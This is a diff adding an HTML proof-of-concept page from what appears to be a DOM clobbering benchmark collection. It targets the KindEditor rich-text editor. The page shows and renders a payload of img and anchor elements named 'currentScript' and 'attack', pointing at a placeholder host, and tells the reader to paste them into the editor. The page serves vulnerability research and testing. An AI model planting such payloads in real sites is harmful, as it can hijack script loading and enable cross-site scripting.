@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOM Clobbering Micro Benchmarks</title>
+    <link rel="stylesheet" href="../styles/styles.css">
+    <style>
+        /* Ensure that long lines in <pre> tags wrap */
+        pre {
+            white-space: pre-wrap;       /* CSS3 */
+            white-space: -moz-pre-wrap;  /* Mozilla */
+            white-space: -pre-wrap;      /* Opera 4-6 */
+            white-space: -o-pre-wrap;    /* Opera 7 */
+            word-wrap: break-word;       /* IE */
+        }
+    </style>
+</head>
+<body>
+<h1>DOM Clobbering Collection - kindeditor</h1>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Payload</span><br><br>
+  <pre>&lt;img name=&quot;currentScript&quot; src=&quot;https://xxx.xxx.xxx&quot;&gt;
+&lt;img name=&quot;attack&quot; src=&quot;https://xxx.xxx.xxx&quot;&gt;
+&lt;a name=&quot;attack&quot; href=&quot;https://xxx.xxx.xxx&quot;&gt;AAA&lt;/a&gt;
+&lt;p&gt;Copy&amp;Paste the following rendered HTML elements to the editor and check the editor in the debugging console: `html = editor.html();`.&lt;/p&gt;</pre>
+  <img name="currentScript" src="https://xxx.xxx.xxx">
+<img name="attack" src="https://xxx.xxx.xxx">
+<a name="attack" href="https://xxx.xxx.xxx">AAA</a>
+<p>Copy&Paste the following rendered HTML elements to the editor and check the editor in the debugging console: `html = editor.html();`.</p>
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Library</span><br><br>
+  <pre>&lt;script src=&quot;./kindeditor-all-min.js&quot;&gt;&lt;/script&gt;
+&lt;textarea id=&quot;editor_id&quot; name=&quot;content&quot; style=&quot;width:700px;height:300px;&quot;&gt;HELLOWORLD!  &lt;/textarea&gt;
+&lt;script&gt; KindEditor.ready(function(K) { window.editor = K.create(&#x27;#editor_id&#x27;);}); &lt;/script&gt;</pre>
+  <script src="./kindeditor-all-min.js"></script>
+<textarea id="editor_id" name="content" style="width:700px;height:300px;">HELLOWORLD!  </textarea>
+<script> KindEditor.ready(function(K) { window.editor = K.create('#editor_id');}); </script>
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <a href="../mermaid/poc.html">Next: mermaid</a>
+  </div>
+</section>
+
+</body>
+</html>
